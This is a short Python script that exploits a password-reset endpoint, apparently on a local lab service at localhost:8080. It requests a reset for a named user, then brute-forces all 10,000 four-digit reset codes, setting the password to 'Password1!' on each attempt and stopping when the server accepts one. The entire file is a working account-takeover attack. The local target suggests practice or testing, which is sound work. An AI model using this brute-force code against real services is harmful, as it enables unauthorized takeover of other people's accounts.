import httpx
import itertools
import string
import asyncio


async def main():
    json = {"username": "hhm", "phone_number": "(505) 56434-7345"}
    res = httpx.post(
        "http://localhost:8080/reset-password",
        json=json,
    )
    res.raise_for_status()

    print(res.json())

    async with httpx.AsyncClient(base_url="http://localhost:8080/") as client:
        for guess in itertools.product(string.digits, repeat=4):
            pin = "".join(guess)
            json.update({"reset_password_code": pin, "new_password": "Password1!"})
            res = await client.post("/reset-password/new-password", json=json)
            print(pin, res.status_code, res.json())
            if res.status_code == 200:
                break


if __name__ == "__main__":
    asyncio.run(main())
